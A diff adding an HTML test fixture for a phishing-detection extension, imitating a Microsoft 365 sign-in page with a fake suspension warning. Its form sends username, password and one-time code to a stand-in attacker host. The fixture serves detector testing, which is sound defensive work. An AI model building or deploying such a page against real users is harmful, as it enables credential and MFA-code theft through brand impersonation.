@@ -1,0 +1,67 @@
+<!doctype html>
+<!--
+  ============================================================================
+  FOR LOCAL TESTING ONLY — DO NOT DEPLOY.
+  Static fixture used by the LocalPhish extension test harness to exercise
+  Stage 2 (DOM) and Stage 3 (LLM) phishing detectors.
+  This page imitates Microsoft 365 sign-in to test brand impersonation.
+  All brand marks are property of their respective owners; this file is for
+  defensive security research only.
+  ============================================================================
+-->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Sign in to your account</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+      body { margin: 0; font-family: 'Segoe UI', system-ui, sans-serif; background: #f2f2f2; color: #1b1b1b; }
+      .frame { max-width: 440px; margin: 80px auto; padding: 44px; background: white; box-shadow: 0 2px 6px rgba(0,0,0,0.16); }
+      .logo { display: flex; align-items: center; gap: 8px; margin-bottom: 20px; }
+      .logo-mark { width: 24px; height: 24px; display: grid; grid-template-columns: 1fr 1fr; }
+      .logo-mark > div { width: 11px; height: 11px; }
+      .logo-mark > :nth-child(1) { background: #f25022; }
+      .logo-mark > :nth-child(2) { background: #7fba00; }
+      .logo-mark > :nth-child(3) { background: #00a4ef; }
+      .logo-mark > :nth-child(4) { background: #ffb900; }
+      .logo-text { font-weight: 600; }
+      h1 { font-size: 24px; font-weight: 600; margin: 0 0 12px; }
+      .urgent { background: #fff4ce; border-left: 4px solid #f9a825; padding: 12px; margin: 0 0 20px; font-size: 13px; }
+      input { width: 100%; padding: 10px; border: 0; border-bottom: 1px solid #666; font-size: 15px; box-sizing: border-box; outline: none; }
+      input:focus { border-bottom-color: #0078d4; }
+      .actions { display: flex; justify-content: flex-end; margin-top: 32px; }
+      button { background: #0078d4; color: white; border: 0; padding: 10px 20px; font-size: 14px; cursor: pointer; min-width: 108px; }
+      a { color: #0078d4; font-size: 13px; }
+      .small { font-size: 13px; margin-top: 16px; }
+    </style>
+  </head>
+  <body>
+    <main class="frame">
+      <div class="logo">
+        <div class="logo-mark"><div></div><div></div><div></div><div></div></div>
+        <span class="logo-text">Microsoft</span>
+      </div>
+
+      <div class="urgent">
+        ⚠ Your Microsoft 365 account will be suspended in 24 hours due to unusual sign-in
+        activity. Verify your identity immediately to keep your data.
+      </div>
+
+      <h1>Sign in</h1>
+
+      <!--
+        Form posts to an unrelated host — classic credential-harvest pattern.
+        Stage 2's cross-origin-form-action signal should flag this.
+      -->
+      <form action="https://harvest.example-attacker.tk/collect.php" method="post">
+        <p><input type="email" name="username" placeholder="Email, phone, or Skype" required /></p>
+        <p><input type="password" name="password" placeholder="Password" required /></p>
+        <p><input type="text" name="otp" autocomplete="one-time-code" placeholder="6-digit verification code (sent to phone)" required /></p>
+        <p class="small">Can't access your account? <a href="#">Sign-in options</a></p>
+        <div class="actions">
+          <button type="submit">Verify now</button>
+        </div>
+      </form>
+    </main>
+  </body>
+</html>
